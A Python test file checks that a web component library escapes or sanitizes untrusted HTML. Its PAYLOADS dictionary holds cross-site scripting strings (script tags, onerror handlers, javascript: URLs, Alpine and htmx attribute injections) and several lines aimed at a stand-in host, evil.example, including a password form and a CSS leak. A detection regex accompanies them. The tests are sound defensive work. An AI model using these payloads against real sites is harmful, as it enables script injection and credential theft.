"""Untrusted strings never become markup (H1/H2 of the 2026-10 review).

* ``Fragment(str)`` and a ``str`` returned from ``Component.render`` are text.
* ``defHTML(s)`` is an allow-list sanitizer.
* ``MarkdownElement`` shows raw HTML as text.
"""

from __future__ import annotations

import re

import pytest
from markupsafe import Markup

from ux_dom import Component, Fragment
from ux_dom.dom.htmlelement import MarkdownElement
from ux_dom.dom.src.html_string import defHTML

PAYLOADS = {
    "alpine_init": '<div x-data x-init="alert(1)">a</div>',
    "alpine_click": '<button x-data @click="alert(1)">b</button>',
    "alpine_bind": "<a x-data :href=\"'javascript:alert(1)'\">c</a>",
    "htmx_on": '<b hx-on="click: alert(1)" hx-on:click="alert(1)">d</b>',
    "htmx_get_load": '<div hx-get="https://evil.example/x" hx-trigger="load">e</div>',
    "style_tag": "<style>body{background:url(https://evil.example/leak)}</style>",
    "style_attr": '<p style="position:fixed;inset:0">f</p>',
    "form": '<form action="https://evil.example"><input name="password"></form>',
    "script": "<script>alert(1)</script>",
    "svg_animate": '<svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>',
    "iframe": '<iframe src="https://evil.example"></iframe>',
    "event_handler": "<img src=x onerror=alert(1)>",
    "js_url": '<a href="java&#x09;script:alert(1)">g</a>',
    "data_attr": '<button data-channel-action="admin.delete">h</button>',
    "comment_breakout": "<p><!-- x --!><img src=x onerror=alert(1)> --></p>",
    "custom_element": "<x-widget onload=alert(1)>i</x-widget>",
}
DANGEROUS = re.compile(
    r"(?i)<(script|style|form|svg|iframe|x-widget|input)\b|\s(on\w+|x-[\w:.-]+|@[\w:.-]+|:[\w.-]+|hx-[\w:.-]+|style|data-[\w-]+)\s*=|javascript:"
)


def render(nodes) -> str:
    return "".join(n.__render__(pretty=False) for n in nodes)


@pytest.mark.parametrize("name", sorted(PAYLOADS))
def test_defhtml_drops_everything_outside_the_allow_list(name):
    out = render(defHTML(PAYLOADS[name]))
    assert not DANGEROUS.search(out), out


def test_defhtml_keeps_safe_formatting():
    src = '<p class="note">a <b>b</b> <a href="https://x.org" rel="nofollow">l</a> <img alt="i" src="/i.png"></p>'
    assert render(defHTML(src)) == src


def test_defhtml_decodes_entities_and_keeps_word_spaces():
    out = render(defHTML("<p>a &amp; b &lt;c&gt; <em>d</em> e</p>"))
    assert out == "<p>a &amp; b &lt;c&gt; <em>d</em> e</p>"


@pytest.mark.parametrize("name", sorted(PAYLOADS))
def test_fragment_string_is_text(name):
    out = Fragment(PAYLOADS[name]).__render__(pretty=False)
    assert "<" not in out


def test_component_string_is_text():
    class Comment(Component):
        def render(self, text):
            return text

    assert (
        Comment(PAYLOADS["alpine_init"]).__render__(pretty=False).startswith("&lt;div")
    )


def test_markup_is_the_explicit_opt_in():
    assert (
        Fragment(Markup("<b x-data>ok</b>")).__render__(pretty=False)
        == '<b x-data="">ok</b>'
    )


def test_markdown_raw_html_is_text():
    class Post(MarkdownElement):
        def render(self, text):
            return text

    out = Post(
        "hi <img src=x onerror=alert(1)> *e* [l](javascript:alert(2))"
    ).__render__(pretty=False)
    assert "<img" not in out
    assert "&lt;img" in out
    assert "<em>e</em>" in out
    assert "javascript:" not in out


def test_trusted_markdown_is_an_explicit_subclass_choice():
    class Doc(MarkdownElement):
        escape_string = False

        def render(self, text):
            return text

    assert "<b>x</b>" in Doc("<b>x</b>").__render__(pretty=False)
